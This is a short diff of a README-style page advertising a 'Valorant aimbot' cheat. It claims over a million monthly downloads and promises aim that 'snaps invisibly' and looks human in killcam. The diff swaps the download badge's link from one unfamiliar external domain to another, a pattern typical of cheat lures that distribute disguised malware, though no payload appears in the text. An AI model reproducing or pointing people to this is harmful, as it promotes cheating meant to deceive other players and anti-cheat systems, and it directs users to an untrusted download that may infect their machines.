@@ -49,7 +49,7 @@ A: Yes — aim snaps invisibly, looks human in killcam.
 
 **Monthly downloads:** 1.4m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/valaimbot2026)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/valaimbot2026)
 
 ---
 
